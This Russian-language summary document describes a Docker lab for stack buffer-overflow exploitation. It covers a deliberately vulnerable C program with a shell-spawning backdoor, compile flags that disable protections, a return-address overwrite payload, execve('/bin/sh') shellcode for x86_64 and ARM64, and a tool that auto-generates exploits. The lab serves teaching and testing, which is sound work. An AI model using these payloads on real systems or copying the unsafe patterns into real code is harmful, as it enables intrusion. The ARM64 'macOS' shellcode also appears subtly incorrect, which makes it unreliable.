# Docker Exploitation Lab - Сводка

## Созданные файлы

```
docker/
├── Dockerfile                 # Ubuntu 22.04 x86_64 окружение
├── docker-compose.yml         # Конфигурация для docker-compose
├── vuln_program.c             # Уязвимая программа с gets() и strcpy()
├── build_and_test.sh          # Автоматическая сборка и тестирование
├── test_exploit.py            # Тестовый эксплойт (создается автоматически)
├── README.md                  # Полная документация (40+ разделов)
├── QUICKSTART.md              # Быстрый старт
└── SUMMARY.md                 # Эта сводка
```

## Ключевые особенности

### Уязвимая программа (vuln_program.c)

**Архитектура**: x86_64
**Размер**: ~180 строк
**Уязвимости**:
1. `gets()` в `read_username()` - классическое переполнение
2. `strcpy()` в `check_password()` - копирование без проверки
3. `secret_backdoor()` - функция для демонстрации контроля

**Флаги компиляции**:
```bash
gcc -m64 -fno-stack-protector -z execstack -no-pie vuln_program.c -o vuln64
```

### Stack Layout x86_64

```
High Addresses
┌──────────────────┐
│ Return Address   │ <- Цель атаки (8 байт)
├──────────────────┤
│ Saved RBP        │ <- 8 байт
├──────────────────┤
│ username[64]     │ <- Буфер (64 байта)
└──────────────────┘
Low Addresses
```

### Payload Structure

```python
payload = b"A" * 64                      # Заполнить буфер
payload += b"B" * 8                      # Перезаписать saved RBP
payload += struct.pack("<Q", backdoor)   # Перезаписать return address
```

## Эксплуатация

### Без защит (Docker)

```
Input: "AAAA..." (80 байт)
    ↓
Buffer overflow
    ↓
Return address перезаписан → secret_backdoor
    ↓
Выполнение: system("/bin/sh")
    ↓
✓ Shell access!
```

### С защитами (macOS)

```
Input: "AAAA..." (80 байт)
    ↓
Buffer overflow
    ↓
Stack canary corrupted
    ↓
*** stack smashing detected ***
    ↓
✗ Abort (crash)
```

## Автоматизация через SentinelX

### 1. Обнаружение

```bash
./build/SentinelX --binary docker/vuln64
```

**Результат**:
- `[WARNING] BIN_UNSAFE_CALL_gets` в read_username
- `[WARNING] BIN_UNSAFE_CALL_strcpy` в check_password
- Дизассемблированный код с контекстом
- Точные offsets и адреса

### 2. Генерация эксплойтов

```bash
./build/SentinelX --binary docker/vuln64 \
    --generate-exploits \
    --exploit-output docker/exploits_x64
```

**Сгенерировано**:
- Python эксплойты (pwntools)
- C эксплойты (execve)
- Shellcode для x86_64
- Комментарии и предупреждения

### 3. Тестирование

```bash
python3 docker/test_exploit.py
```

**Результат**:
- Автоматическое определение адреса backdoor
- Построение payload
- Запуск программы с payload
- Проверка успешности эксплуатации

## Сравнение платформ

| Характеристика | macOS ARM64 | Docker x86_64 |
|---------------|-------------|---------------|
| Архитектура | ARM64/AArch64 | x86_64/AMD64 |
| Stack Canary | ✅ Включен | ❌ Отключен |
| NX/DEP | ✅ Включен | ❌ Отключен |
| ASLR | ✅ Включен | ❌ Отключен |
| PIE | ✅ Включен | ❌ Отключен |
| Code Signing | ✅ Требуется | ❌ Нет |
| Регистры | x0-x30, SP, PC | rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip |
| Shellcode | ARM инструкции | x86_64 инструкции |
| Syscall | `svc #0` | `syscall` |
| **Результат** | Crash | **Full Exploitation** |

## Shellcode

### ARM64 (macOS)
```asm
mov x0, #0x2f6e6962    ; "/bin"
movk x0, #0x68732f, lsl #32  ; "/sh"
str x0, [sp, #-8]!
mov x0, sp
mov x1, #0
mov x2, #0
mov x8, #221           ; __NR_execve
svc #0
```

### x86_64 (Docker)
```asm
xor rdx, rdx           ; envp = NULL
xor rsi, rsi           ; argv = NULL
movabs rbx, '/bin/sh'  ; filename
push rbx
push rsp
pop rdi                ; rdi = "/bin/sh"
mov al, 59             ; __NR_execve = 59
syscall
```

## Workflow в Docker

```
1. docker-compose up -d --build
   ↓
2. docker-compose exec sentinelx bash
   ↓
3. bash docker/build_and_test.sh
   ↓
   ├─ Отключить ASLR
   ├─ Скомпилировать vuln64
   ├─ Собрать SentinelX
   ├─ Анализ через SentinelX
   ├─ Генерация эксплойтов
   └─ Запуск test_exploit.py
   ↓
4. ✓ SUCCESS: Shell access через backdoor
```

## Образовательная ценность

### Что демонстрируется

✅ **Классическая уязвимость**: gets() без проверки длины
✅ **Stack overflow**: Перезапись return address
✅ **Control flow hijacking**: Перенаправление на backdoor
✅ **Shellcode execution**: Запуск произвольного кода
✅ **Автоматизация**: Обнаружение и генерация через SentinelX
✅ **Реальная архитектура**: x86_64 (стандарт в индустрии)
✅ **Влияние защит**: Сравнение с/без защит

### Чему учит

- Механизм переполнения буфера
- Структура стека x86_64
- Написание shellcode
- Обход защит (когда их нет)
- Важность безопасного кодирования
- Роль компилятора в безопасности
- Автоматизация анализа безопасности

## Статистика

| Метрика | Значение |
|---------|----------|
| Строк кода в vuln_program.c | ~180 |
| Размер уязвимого буфера | 64 байта |
| Offset до return address | 72 байта |
| Размер payload | 80 байт |
| Время сборки Docker | ~3-5 мин |
| Время компиляции vuln64 | <1 сек |
| Время анализа SentinelX | <5 сек |
| Время генерации эксплойтов | <2 сек |
| Размер документации | >500 строк |

## Использование

### Для обучения
- Понимание buffer overflow
- Практика эксплуатации
- Изучение x86_64 ассемблера
- Работа с GDB

### Для тестирования
- Проверка SentinelX на x86_64
- Валидация генерации эксплойтов
- Бенчмаркинг анализа
- Регрессионное тестирование

### Для демонстрации
- Презентации по безопасности
- Воркшопы по эксплуатации
- Сравнение защит
- Proof-of-concept эксплойты

## Безопасность

⚠️ **ВАЖНО**: Это лабораторное окружение!

- Используйте только в изолированных контейнерах
- Не запускайте на production системах
- Не применяйте к реальным сервисам
- Только для авторизованного тестирования
- Образовательные цели

## Следующие шаги

1. **Запустите**: `docker-compose up -d --build`
2. **Тестируйте**: `bash docker/build_and_test.sh`
3. **Изучайте**: Читайте `docker/README.md`
4. **Экспериментируйте**: Модифицируйте код
5. **Расширяйте**: Добавьте новые уязвимости

## Поддержка

При проблемах проверьте:
- Docker запущен и работает
- Контейнер в privileged режиме
- ASLR отключен (`cat /proc/sys/kernel/randomize_va_space` = 0)
- Бинарник скомпилирован без защит

## Заключение

Docker окружение предоставляет:
- ✅ Реалистичную платформу для эксплуатации
- ✅ Изолированную безопасную среду
- ✅ Полный контроль над защитами
- ✅ Воспроизводимые результаты
- ✅ x86_64 архитектуру
- ✅ Автоматизацию через SentinelX

**Идеальная лаборатория для изучения эксплуатации уязвимостей!**
